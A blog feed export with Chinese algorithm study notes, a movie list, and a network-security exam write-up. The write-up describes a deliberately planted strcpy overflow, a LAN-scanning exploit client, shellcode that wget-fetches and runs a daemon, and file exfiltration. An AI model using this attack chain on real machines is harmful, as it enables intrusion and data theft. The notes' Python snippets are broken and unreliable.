<li><p>爬楼梯（第二个楼梯就有两种走法。）：dp[i] = dp[i-1]+dp[i-2]</p>
</li>
<li><p>最长连续有效括号长度：</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618005426781.png" alt="image-20200618005426781"></p>
</li>
</ul>
<h1 id="三、贪心"><a href="#三、贪心" class="headerlink" title="三、贪心"></a>三、贪心</h1><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618005649956.png" alt="image-20200618005649956"></p>
<h2 id="活动安排问题"><a href="#活动安排问题" class="headerlink" title="活动安排问题"></a>活动安排问题</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618005723278.png" alt="image-20200618005723278"></p>
<h2 id="小数背包问题"><a href="#小数背包问题" class="headerlink" title="小数背包问题"></a>小数背包问题</h2><p>计算每种物品的<strong>单位重量-价值</strong>作为贪心选择的依据指标，选择<strong>单位重量-价值最高</strong>的物品，将尽可能多的该物品装入背包，依此策略一直地进行下去，直到背包装满为止。<img src="/2020/07/07/2020-07-07-algorithm/image-20200618005909341.png" alt="image-20200618005909341"></p>
<h2 id="Dijkstra单源最短路径问题-✍"><a href="#Dijkstra单源最短路径问题-✍" class="headerlink" title="Dijkstra单源最短路径问题  ✍"></a>Dijkstra单源最短路径问题  ✍</h2><p>给定带权有向图G =(V,E)，其中每条边的权是非负实数。另外，还给定V中的一个顶点，称为<strong>源</strong>。现在要计算从源到所有其他各顶点的<strong>最短长度</strong>。这里路的长度是指路上各边权之和。这个问题通常称为<strong>单源最短路径</strong>问题。 </p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618010401065.png" alt="image-20200618010401065"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618010537461.png" alt="image-20200618010537461"></p>
<h2 id="单源最短路径（存在？）：Bellman-Ford"><a href="#单源最短路径（存在？）：Bellman-Ford" class="headerlink" title="单源最短路径（存在？）：Bellman-Ford"></a>单源最短路径（存在？）：Bellman-Ford</h2><ul>
<li>推理：如果在|V|-1 次循环后，d[v]不能收敛，则存在权重为负的环路</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618011326388.png" alt="image-20200618011326388"></p>
<h2 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618011551452.png" alt="image-20200618011551452"></p>
<h3 id="Prim算法-——避圈法-Θ-n-2-✍🆗"><a href="#Prim算法-——避圈法-Θ-n-2-✍🆗" class="headerlink" title="Prim算法  ——避圈法  Θ(n^2^)  ✍🆗"></a>Prim算法  ——避圈法  Θ(n^2^)  ✍🆗</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618012144452.png" alt="image-20200618012144452"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618012437116.png" alt="image-20200618012437116"></p>
<h3 id="Kruskal算法-——避圈法-O-mlogm-n-✍🆗"><a href="#Kruskal算法-——避圈法-O-mlogm-n-✍🆗" class="headerlink" title="Kruskal算法    ——避圈法 O(mlogm+n)  ✍🆗"></a>Kruskal算法    ——避圈法 O(mlogm+n)  ✍🆗</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618011725626.png" alt="image-20200618011725626"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618012448158.png" alt="image-20200618012448158"></p>
<h3 id="破圈法-（”-圈”指的是回路）"><a href="#破圈法-（”-圈”指的是回路）" class="headerlink" title="破圈法  （” 圈”指的是回路）"></a>破圈法  （” 圈”指的是回路）</h3><p>求最小生成树有两种方法，一种是破圈法，另一种是避圈法（Kruskal,Prim也是求MST的算法）。</p>
<p>破圈法是“见圈破圈”，即如果看到图中有一个圈，就将这个圈的边去掉一条，直至图中再无一圈为止。</p>
<p>步骤如下：</p>
<ol>
<li>在图中找一个回路</li>
<li>去掉该回路中权值最大的边，但要保持图仍为连通。</li>
<li>反复此过程，直至图中再无回路（但仍保持连通），得到最小生成树。</li>
</ol>
<p>最后结果根据操作选取不同可能不唯一，但图的权值和（生成树的代价）相同，均为最小值。</p>
<p>避圈法则采取先将图中的点都取出来，然后，逐渐向上面添边，并保证后添入的边不与以前添上的边构成圈就可以了，这个过程直到将边集中能加入的边（加入后不够成圈）都加完为止。参见词条“Prim算法”和“Kruskal算法”。</p>
<h2 id="其他问题-2"><a href="#其他问题-2" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li>找硬币，最少找硬币数</li>
<li>霍夫曼编码：（编码）将每个码字连接起来。最低频的两个字符在最优编码树中，一定是深度最深的两个叶子</li>
<li>孩子分糖，最多满足孩子数，从最容易满足的孩子找最小的糖</li>
</ul>
<h1 id="四、图的遍历"><a href="#四、图的遍历" class="headerlink" title="四、图的遍历"></a>四、图的遍历</h1><h2 id="深度优先搜索树-⭐"><a href="#深度优先搜索树-⭐" class="headerlink" title="深度优先搜索树 ⭐"></a>深度优先搜索树 ⭐</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618170234724.png" alt="image-20200618170234724"></p>
<ul>
<li><p><strong>predfn（先序号）</strong>：在图的深度优先搜索生成树(森林)中顶点的先序号，是指按照先序方式访问该生成树，该顶点的序号。</p>
</li>
<li><p><strong>postdfn（后序号）</strong>：在图的深度优先搜索生成树(森林)中顶点的后序号，是指按照后序方式访问该生成树，该顶点的序号。</p>
</li>
</ul>
<p><strong>无向图只有两条边——树边、回边</strong> （由于前向边、横跨边的定义） </p>
<p>*<em>有向图情形 ——四种边 *</em> Θ(n^2^ ) 使用邻接矩阵</p>
<blockquote>
<p>广度优先中：</p>
<p>在无向图中，边分为：树边或者是横跨边。(横跨边没有父子关系)</p>
<p>在有向图中，边分为：树边，回边及横跨边。不存在前向边。</p>
</blockquote>
<ul>
<li><p>树边(Tree edges)－ 深度优先搜索生成树中的边：探测边(v,w)时，w是 “unvisited”状态，则边(v,w)是树边。</p>
</li>
<li><p>回边(Back edges)－在迄今为止所构建的深度优先搜索生成树中，w是v的祖先，并且在探测(v,w)时，w已经被标记为”visited”,则(v,w)为回边。 </p>
</li>
<li><p>前向边(Forward edges)－在迄今为止所构建的深度优先搜索生成树中，w是v的后裔，并且在探测(v,w)时，w已经被标记为”visited”,则(v,w)为前向边。 </p>
</li>
<li><p>横跨边(Cross edges)－所有其他的边。</p>
</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618170207228.png" alt="image-20200618170207228"></p>
<h2 id="广度优先搜索树"><a href="#广度优先搜索树" class="headerlink" title="广度优先搜索树"></a>广度优先搜索树</h2><p>在无向图中，边分为：树边或者是横跨边。</p>
<p>在有向图中，边分为：树边，回边及横跨边。不存在前向边。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618175112082.png" alt="image-20200618175112082"></p>
<h2 id="图的无回路性判定-有向-无向图"><a href="#图的无回路性判定-有向-无向图" class="headerlink" title="图的无回路性判定  有向/无向图"></a>图的无回路性判定  有向/无向图</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174030579.png" alt="image-20200618174030579"></p>
<h2 id="拓扑排序-——有向图"><a href="#拓扑排序-——有向图" class="headerlink" title="拓扑排序  ——有向图"></a>拓扑排序  ——有向图</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174500149.png" alt="image-20200618174500149"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174445964.png" alt="image-20200618174445964"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174428002.png" alt="image-20200618174428002">    </p>
<h2 id="强连通分支-——有向图-✍"><a href="#强连通分支-——有向图-✍" class="headerlink" title="强连通分支 ——有向图  ✍"></a>强连通分支 ——有向图  ✍</h2><p>有向图G=(V,E)，强连通集为顶点的极大集。<strong>在该集合中，每一对顶点都存在一条路径</strong>。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174607857.png" alt="image-20200618174607857"></p>
<ul>
<li>首先深度优先搜索，得到postdfn后序号</li>
<li>颠倒G中边的方向，构成一个新的图G’</li>
<li>图G’从最大的postdfn开始执行深搜，如果不能达到所有节点，换一个顶点继续</li>
<li>最后得到的森林中，每棵树对应一个强连通分支</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618174801988.png" alt="image-20200618174801988"></p>
<h1 id="五、回溯法"><a href="#五、回溯法" class="headerlink" title="五、回溯法"></a>五、回溯法</h1><p>节点是由<strong>深度优先搜索方法生成</strong>的。<strong>不需要存储整棵搜索树，只需要存储根到当前活动节点的路径</strong>。</p>
<ul>
<li>活节点：正常节点</li>
<li>扩展节点：当前节点，正在对此节点进行搜索</li>
<li>死节点：不可行节点，无需对其下面的节点进行搜索</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618180648879.png" alt="image-20200618180648879"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618180641217.png" alt="image-20200618180641217"></p>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618183544530.png" alt="image-20200618183544530"></p>
<p>递归回溯</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618183408900.png" alt="image-20200618183408900"></p>
<p>迭代回溯</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618183418523.png" alt="image-20200618183418523"></p>
<h2 id="皇后问题"><a href="#皇后问题" class="headerlink" title="皇后问题"></a>皇后问题</h2><p>所以，尽管在最坏情况下要用O(n^n^)时间来求解，然而大量实际经验表明，它在有效性上远远超过蛮力方法O(n!)。例如在4 皇后问题中，只搜索了341个节点中的27个就找到了解。 </p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618181044719.png" alt="image-20200618181044719"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618181024810.png" alt="image-20200618181024810"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618181018188.png" alt="image-20200618181018188"></p>
<h2 id="分支界限法-与-回溯法的区别（旅行商TSP）"><a href="#分支界限法-与-回溯法的区别（旅行商TSP）" class="headerlink" title="分支界限法 与 回溯法的区别（旅行商TSP）"></a>分支界限法 与 回溯法的区别（旅行商TSP）</h2><p>分支限界法与回溯法的<strong>搜索方式</strong>不同</p>
<ul>
<li><p>回溯法：深度优先</p>
</li>
<li><p>分支限界法：广度优先或最小耗费（最大收益）优先</p>
</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618184212297.png" alt="image-20200618184212297"></p>
<p>两种分支限界法：</p>
<ul>
<li><p>队列式(FIFO)分支限界法(宽度优先)：按照队列先进先出（FIFO）原则选取下一个节点为扩展节点。</p>
</li>
<li><p><strong>优先队列式分支限界法</strong>(最小耗费或是最大收益优先)：按照优先队列中规定的优先级选取优先级最高的节点成为当前扩展节点。</p>
<ul>
<li>最大优先队列：使用最大堆，体现最大收益优先</li>
<li>最小优先队列：使用最小堆，体现最小耗费优先</li>
</ul>
</li>
</ul>
<h3 id="旅行商"><a href="#旅行商" class="headerlink" title="旅行商"></a>旅行商</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618185211728.png" alt="image-20200618185211728"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618185122634.png" alt="image-20200618185122634"></p>
<h1 id="第六章、NP问题"><a href="#第六章、NP问题" class="headerlink" title="第六章、NP问题"></a>第六章、NP问题</h1><p><strong>如果对一个问题∏存在一个算法，时间复杂性为O(n^k^)，其中n是问题规模，k是一个非负整数，则称问题∏存在多项式时间算法。</strong>这类算法在可以接受的时间内实现问题求解</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618185259193.png" alt="image-20200618185259193"></p>
<h2 id="1-P、NP、NPC、co-NP"><a href="#1-P、NP、NPC、co-NP" class="headerlink" title="1. P、NP、NPC、co-NP"></a>1. P、NP、NPC、co-NP</h2><p>P属于NP，人们猜测P ≠ NP，但是否成立，至今未得到证明。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190959962.png" alt="image-20200618190959962"></p>
<h3 id="1-P类问题"><a href="#1-P类问题" class="headerlink" title="1 P类问题"></a><strong>1 P类问题</strong></h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618185944301.png" alt="image-20200618185944301"></p>
<h3 id="2-NP类问题"><a href="#2-NP类问题" class="headerlink" title="2 NP类问题"></a><strong>2 NP类问题</strong></h3><p>非确定性算法：就是说，能以猜测和验证的方式工作，而且两个步骤都能在多项式时间内完成。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190230249.png" alt="image-20200618190230249"></p>
<p>np问题：即每个实例都可以用非确定性算法得出一个yes/no的答案。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190115671.png" alt="image-20200618190115671"></p>
<h3 id="3-NPC问题"><a href="#3-NPC问题" class="headerlink" title="3 NPC问题"></a><strong>3 NPC问题</strong></h3><ul>
<li>证明问题A是NP问题</li>
<li>证明一个已证的NPC问题可多项式输入转化为问题A，而其俩的输出可以相互转化。s</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190709531.png" alt="image-20200618190709531"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618190941751.png" alt="image-20200618190941751"></p>
<h3 id="4-NP-Hard"><a href="#4-NP-Hard" class="headerlink" title="4 NP-Hard"></a>4 NP-Hard</h3><p>NP-Hard不是NP问题，但是和NPC一样难</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618192130504.png" alt="image-20200618192130504"></p>
<h3 id="5-co-NP问题"><a href="#5-co-NP问题" class="headerlink" title="5 co-NP问题"></a>5 co-NP问题</h3><p>就是说，NP的猜测和验证只需要进行到某个x正确就结束了。co-NP的猜测和验证必须要全遍历全部x吗?</p>
<p>我是纠结在了，co-NP也是猜测和验证上的hh，现在看来确实不一样</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618191247412.png" alt="image-20200618191247412"></p>
<h2 id="2-最大团-SAT∝poly团-⭐"><a href="#2-最大团-SAT∝poly团-⭐" class="headerlink" title="2. 最大团  (SAT∝poly团) ⭐"></a>2. 最大团  (SAT∝<del>poly</del>团) ⭐</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618191635190.png" alt="image-20200618191635190"></p>
<h2 id="3-三元可满足性问题3SAT-SAT∝poly3SAT"><a href="#3-三元可满足性问题3SAT-SAT∝poly3SAT" class="headerlink" title="3. 三元可满足性问题3SAT     (SAT∝poly3SAT)"></a>3. 三元可满足性问题3SAT     (SAT∝<del>poly</del>3SAT)</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618191833664.png" alt="image-20200618191833664"></p>
<h2 id="4-顶点覆盖问题-3SAT∝polyVC-重点看📕"><a href="#4-顶点覆盖问题-3SAT∝polyVC-重点看📕" class="headerlink" title="4. 顶点覆盖问题  (3SAT∝polyVC) 重点看📕"></a>4. 顶点覆盖问题  (3SAT∝<del>poly</del>VC) 重点看📕</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618192412490.png" alt="image-20200618192412490"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619121945353.png" alt="image-20200619121945353"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619122459457.png" alt="image-20200619122459457"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619125859905.png" alt="image-20200619125859905"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130009272.png" alt="image-20200619130009272"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619125921925.png" alt="image-20200619125921925"></p>
<h2 id="第二章-动态规划"><a href="#第二章-动态规划" class="headerlink" title="第二章 动态规划"></a>第二章 动态规划</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619125942195.png" alt="image-20200619125942195"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130057070.png" alt="image-20200619130057070"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619131851675.png" alt="image-20200619131851675"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CHESS_COIN</span><span class="params">(c)</span>:</span></span><br><span class="line">    lenc=len(c)</span><br><span class="line">    OPT=[lenc][lenc]</span><br><span class="line"><span class="comment">#这是上半部分初始化最高行的代码：</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lenc):    <span class="comment">#遍历最高行(y)的每列(x)，从0~n-1</span></span><br><span class="line">		 OPT(i,lenc<span class="number">-1</span>)=(i,lenc<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#这是下半部分遍历计算的代码：</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(lenc<span class="number">-1</span>:<span class="number">0</span>):  <span class="comment">#遍历行(y)，从n-2~0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(lenc):  <span class="comment">#遍历列(x)，从0~n-1</span></span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">0</span> :		 <span class="comment">#最左列</span></span><br><span class="line">                OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i+<span class="number">1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">            <span class="keyword">elif</span> i==n<span class="number">-1</span>:	<span class="comment">#最右列</span></span><br><span class="line">                OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i<span class="number">-1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">            <span class="keyword">else</span>:			<span class="comment">#其余列</span></span><br><span class="line">            	OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i<span class="number">-1</span>,j+<span class="number">1</span>),OPT(i+<span class="number">1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">    <span class="keyword">return</span> OPT</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work_arrange</span><span class="params">(w)</span></span></span><br><span class="line">	OPT=[len(w)]</span><br><span class="line">    <span class="keyword">if</span> len(w)&gt;=<span class="number">1</span>:	 <span class="comment">#一天（含）以上的OPT安排	</span></span><br><span class="line">        OPT[<span class="number">0</span>]=w[<span class="number">0</span>]  <span class="comment">#w[0]是工作第0天工作的工资，为零</span></span><br><span class="line">        OPT[<span class="number">1</span>]=w[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> len(w)&gt;=<span class="number">2</span>:	 <span class="comment">#两天（含）以上的OPT安排</span></span><br><span class="line">        OPT[<span class="number">2</span>]=w[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:			<span class="comment">#三天（含）以上的OPT安排</span></span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">3</span> to len(w):  <span class="comment">#对于三天以上的每天，都有三种情况</span></span><br><span class="line">            OPT[i]=max(OPT[i<span class="number">-1</span>],OPT[i<span class="number">-2</span>]+w[i],OPT[i<span class="number">-3</span>]+w[i<span class="number">-1</span>]+w[i]) </span><br><span class="line">    <span class="keyword">return</span> OPT</span><br></pre></td></tr></table></figure>

<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130115423.png" alt="image-20200619130115423"></p>
<h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130132348.png" alt="image-20200619130132348"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619131155873.png" alt="image-20200619131155873"></p>
<h2 id="第五章-回溯法"><a href="#第五章-回溯法" class="headerlink" title="第五章 回溯法"></a>第五章 回溯法</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619130151111.png" alt="image-20200619130151111"></p>
<h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619121945353.png" alt="image-20200619121945353"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>观影记录</title>
    <url>/2020/06/29/2020-06-29-Viewing-record/</url>
    <content><![CDATA[<p><img src="/2020/06/29/2020-06-29-Viewing-record/image-20200714012526750.png" alt="image-20200714012526750"></p>
<a id="more"></a>

<h1 id="观影记录——2020-06-06"><a href="#观影记录——2020-06-06" class="headerlink" title="观影记录——2020-06-06"></a>观影记录——2020-06-06</h1><ul>
<li>《银魂完结篇：直到永远的万事屋》由于之前没看过银魂，很多梗get不到，喜剧</li>
<li>《楚门的世界》没看</li>
<li>《刺客信条》2016，听说不好，但特效ok</li>
<li>《飞驰人生》19年春节档，歌《奉献》</li>
<li>《彗星来的那一夜》没看</li>
<li>《黑豹》</li>
<li>《让子弹飞》姜文，有内涵的喜剧</li>
<li>《西虹市首富》喜剧片，歌《燃烧我的卡路里》</li>
<li>《恋恋笔记本》需要静下来看</li>
<li>《东邪西毒》画质太差看不下去</li>
<li>《蜘蛛侠：英雄归来》没看</li>
<li>《三傻大闹宝莱坞》喜剧，但是看不下去，跳着看</li>
<li>《大象席地而坐》没看，但是讨论很多，作者拍完就自……</li>
<li>《复仇者联盟4：终局之战》结局，19年上半年上映</li>
<li>《寄生虫》韩国社会上层和下层人的寄生关系，对社会的讽刺，获奖极多……</li>
<li>《爱乐之城》音乐剧，没看完，暂时不喜欢音乐剧</li>
<li>《霸王别姬》讲了一个很长的故事</li>
<li>《白蛇：缘起》18年下半年上映</li>
<li>《百鸟朝凤》好看</li>
<li>《大护法》记不清什么时候的电影了，好像是高三时候，血腥，有点意思</li>
<li>《大话西游之大圣娶亲》不戴金箍不能保护你，戴上金箍不能爱你</li>
<li>《刀🗡剑神域：序列之争剧场版》质量很ok的番外</li>
<li>《盗梦空间》烧脑</li>
<li>《放牛班的春天》被推荐的，还没看</li>
<li>《缝纫机乐队》好看</li>
<li>《黑客帝国》三部曲，思考人生，缸中之脑</li>
<li>《机械姬》只是看了画面下，还没看</li>
<li>《假如爱有天意》忘了</li>
<li>《教父》起飞</li>
<li>《看不见的客人》烧脑悬疑，反转极大</li>
<li>《两小无猜》没看</li>
<li>《灵魂摆渡·黄泉》还挺好看的</li>
<li>《龙猫》宫崎骏</li>
<li>《明日的我与昨日的你约会》忘了</li>
<li>《那些年，我们一起追的女孩》台湾电影</li>
<li>《你眼中的世界》这个很喜欢</li>
<li>《怦然心动》同名小说《flipped》</li>
<li>《七月与安生》没看</li>
<li>《前任3：再见前任》大一，17年下半年，电影虽然很狗血，但歌风靡一时</li>
<li>《闪光少女》讲民乐和西洋乐的冲突交集</li>
<li>《声之形》讲校园霸凌，后面逐渐向好吧</li>
<li>《死侍2》有两部，笑就完事了</li>
<li>《天使爱美丽》没看完</li>
<li>《头号玩家》18年上半年</li>
<li>《闻香识女人》人的视野，境界很重要</li>
<li>《我不是潘金莲》公选政治课老师有推荐，讲中国的上诉维权之类的</li>
<li>《我想吃掉你的胰脏》同名小说改编，19年又出了动画版</li>
<li>《无双》印钞世界，无双</li>
<li>《肖申克的救赎》看了两回，感想完全不同，估计现在看又不同</li>
<li>《绣春刀》有两部，很过瘾</li>
<li>《血观音》台湾的官场?FG推荐</li>
<li>《湮灭》科幻片</li>
<li>《妖猫传》唐玄宗，杨贵妃，李太白，值得一看</li>
<li>《遇见你真好》忘了</li>
<li>《指环王》三部，没看完</li>
<li>《中国合伙人》背景取自新东方俞敏洪，中美之间的看法挺有意思</li>
<li>《重庆森林》没看完</li>
<li>《侏罗纪世界》有几部</li>
<li>《三块广告牌》没看</li>
<li>《华尔街之狼》看了三个小时，不知道什么感受，纸醉金迷，很讽刺</li>
</ul>
<p>电视剧</p>
<ul>
<li>《鬼吹灯之怒晴湘西》比较贴近小说</li>
<li>《切尔诺贝利》美剧，跳着看</li>
<li>《权力的游戏》七季美剧，跳着看</li>
<li>《长安十二时辰》同名小说改变，张小敬……</li>
<li>《庆余年》没看</li>
<li>《西部世界》美剧，三季</li>
<li>《性教育》美剧</li>
<li>《少年谢尔顿》美剧</li>
<li>《生活大爆炸》美剧</li>
</ul>
<p>动漫，主要在b站看了</p>
<ul>
<li>《进击的巨人》</li>
<li>《斗破苍穹特别篇》很还原有两集，暂时不删了，怕以后找不到</li>
<li>《夏日大作战》动漫电影，没看完</li>
<li></li>
</ul>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全综合实验设计</title>
    <url>/2020/06/22/2020-06-22-NS-The-Final-Exam/</url>
    <content><![CDATA[<p>Network_Security final exam</p>
<h1 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a>总体设计</h1><p><strong>任务一</strong>：做一个服务端程序，其功能是：收到客户端请求之后，将请求中的字符串前后翻转，然后返回给客户端。<strong>（30 分）</strong></p>
<p><strong>任务二</strong>：基于上述服务程序，在保持基本功能的前提下，设计一个缓冲区溢出漏洞。并编写恶意客户端程序，扫描局域网内的所有机器，找到有该漏洞的服务端机器，在服务端机器上创建一个 txt 的文件，文件名是你的姓名.txt，文件内容是你的学号。<strong>（40 分）</strong></p>
<p><strong>任务三</strong>：利用上述漏洞，把一个自己设计的程序 daemon 送上服务端机器并运行，这个 daemon能够搜索服务器上的所有 txt 文件，并找出文件名中含有你的姓名的文件，并利用网络传送给客户端机器（传出的方法不限，例如：email，在线 socket 连接等）。<strong>（20 分）</strong></p>
<p><strong>任务四：</strong>在上述任务的基础上，设计一种密钥管理机制和传输加密方案，模拟将传输内容加密（包含文件名和文件内容）发送给客户端机器。用 wireshark 等工具抓取传输内容，证明未加密与加密的区别，并分析你所设计的密钥管理机制和传输加密方案的安全性。<strong>（10 分）</strong></p>
<ul>
<li><strong>对于任务一的字符串前后翻转服务端程序</strong>，我使用c语言编写，编写简单的sokcet通信服务，缓冲区溢出漏洞在其业务函数中使用了strcpy()导致栈溢出的问题。</li>
<li><strong>对于任务二的恶意客户端程序</strong>，我采用python编写，其功能有<ul>
<li>扫描遍历局域网中的ip地址，通过socket尝试连接端口，找出有运行服务端程序的机器</li>
<li>与任务一的字符串前后翻转服务端程序交互，发出字符串，然后收到翻转后的字符串并打印</li>
<li>exploit的功能，发送针对漏洞的payload（包含三种shellcode）</li>
</ul>
</li>
<li><strong>对于任务三中的程序 daemon</strong>，我使用python编写，能够搜索服务器上的任意指定文件（可以指定为我们的文件名中含有你的姓名的文件），并利用网络传送给客户端。</li>
<li><strong>对于任务四中的密钥管理机制和传输加密方案</strong><ul>
<li>首先daemon.py作为服务器（受害方）被shellcode启动</li>
<li>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</li>
<li>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</li>
<li>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</li>
</ul>
</li>
<li><strong>用 wireshark 等工具抓取传输内容，证明未加密与加密的区别</strong><ul>
<li>如果传输文件内容未加密，则wireshark 抓取到socket发送的包，可以直接在data部分看到传输的内容</li>
<li>如果传输文件内容未加密，则抓取到的包，data部分是密文，无法被破译。</li>
</ul>
</li>
<li><strong>包含了三种shellcode</strong>——创建学号.txt、下载 daemon程序、运行daemon程序<ul>
<li>创建学号.txt，汇编使用了linux的系统调用（32位下实验：调用号5打开文件、调用号6关闭文件）</li>
<li>下载 daemon程序，汇编使用了<strong>/usr/bin/wget</strong>程序来下载daemon（从攻击方开启的apache服务器中下载)</li>
<li>运行daemon程序，汇编通过<strong>/usr/bin/python daemon.py</strong>来运行</li>
</ul>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li><p>这次的期末考试，看似内容很短，其实囊括了很多内容，很多功能要实现。对linux系统的一些操作、socket的通信、栈溢出漏洞的设计与调试、扫描ip端口、linux的文件搜索、密钥管理方案的设计、抓包的分析以及shellcode的编写，多多少少都学习到了一些，掌握了一些。</p>
</li>
<li><p>暴露了我一些致命的问题，对linux操作系统的不熟悉、对c、c++的陌生、很多概念只是口头上说着好，实际代码能力却不足，还希望能够进步。</p>
</li>
<li><p>觉得最大的收获估计是对linux系统的一些操作以及shellcode的编写吧，对shellcode不再是纸上谈兵。虽然shellcode可以用工具生成，但自己编写shellcode使我对其不再云里雾里，成就感很足。勾起了我安全方向的兴趣，不知道以后有没有缘分搞安全了。</p>
</li>
<li><p>查阅了很多资料，这次考试基本上是对这门课所学的、所实验的东西进行了一个汇总。这一学期也不容易，因为学的东西多呀，所以实验和大作业都很多。虽然花了很多时间，但还是很有收获的。</p>
</li>
<li><p>本次写shellcode遇到了一些困难，列举如下:</p>
<ul>
<li>不清楚如何对不够4字节整数的字符串进行控制避免<code>00</code>字节——<ul>
<li>可以通过call</li>
<li>也可以通过linux中：<code>/</code>&lt;=&gt;<code>/////</code>   、 <code>x</code>&lt;=&gt;<code>./////x</code>等来实现4字节整数</li>
</ul>
</li>
<li>编译的位数问题，由于32位和64位的系统调用有所不同，如果想用32位的系统调用号，就要<ul>
<li><code>nasm -felf32 wget.nasm -o wget.o</code><br><code>ld -m elf_i386 wget.o -o wget</code></li>
</ul>
</li>
